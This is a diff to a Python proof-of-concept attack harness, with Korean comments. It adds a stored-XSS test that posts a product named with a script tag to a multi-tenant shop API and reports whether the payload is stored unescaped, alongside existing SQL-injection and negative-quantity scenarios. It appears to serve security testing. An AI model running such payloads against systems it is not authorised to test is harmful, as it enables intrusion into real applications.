@@ -119,17 +119,47 @@ def attack_sqli(base, admin_user, admin_pass):
         print(f"\n[RESULT] 🟢 DEFENDED — 인젝션 무력화(0건/차단). 안전 바인딩 또는 탐지→방어 활성.")
         return 0
 
+def attack_xss(base, admin_user, admin_pass):
+    print("=== AIR PoC: Stored XSS (상품명 스크립트 저장) ===")
+    admin_tok, _ = login(base, admin_user, admin_pass)
+    tid, _, _, _ = prepare(base, admin_tok)
+
+    payload = "<script>alert('air-xss')</script>"
+    print(f"[>] 상품 생성 name={payload}")
+    st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/products', admin_tok,
+                 {'name': payload, 'price': 1000, 'stock': 1})
+    print(f"[<] 생성 응답: HTTP {st}")
+
+    pid = (j or {}).get('data', {}).get('id') if j else None
+    if not pid:
+        print(f"\n[RESULT] 🟢 DEFENDED — 생성이 차단됨(저장 안 됨).")
+        return 0
+
+    # 저장된 상품을 다시 조회해 name 에 원본 스크립트가 그대로 남아있는지 확인
+    st, j = call(base, 'GET', f'/api/v1/tenants/{tid}/products/{pid}', admin_tok)
+    stored = (j or {}).get('data', {}).get('name', '')
+    print(f"[*] 저장된 name: {stored}")
+
+    if '<script' in stored.lower():
+        print(f"\n[RESULT] 🔴 VULNERABLE — 스크립트가 원문 그대로 저장됨(저장형 XSS).")
+        return 1
+    else:
+        print(f"\n[RESULT] 🟢 DEFENDED — 입력이 이스케이프/제거됨(스크립트 무력화).")
+        return 0
+
 def main():
     ap = argparse.ArgumentParser(description="AIR PoC 공격 모듈")
     ap.add_argument('--base', required=True, help='타깃 베이스 URL (예: http://13.125.184.233)')
     ap.add_argument('--admin-user', required=True)
     ap.add_argument('--admin-pass', required=True)
-    ap.add_argument('scenario', choices=['negative-qty', 'sqli'])
+    ap.add_argument('scenario', choices=['negative-qty', 'sqli', 'xss'])
     a = ap.parse_args()
     if a.scenario == 'negative-qty':
         sys.exit(attack_negative_qty(a.base, a.admin_user, a.admin_pass))
     elif a.scenario == 'sqli':
         sys.exit(attack_sqli(a.base, a.admin_user, a.admin_pass))
+    elif a.scenario == 'xss':
+        sys.exit(attack_xss(a.base, a.admin_user, a.admin_pass))
 
 if __name__ == '__main__':
     main()
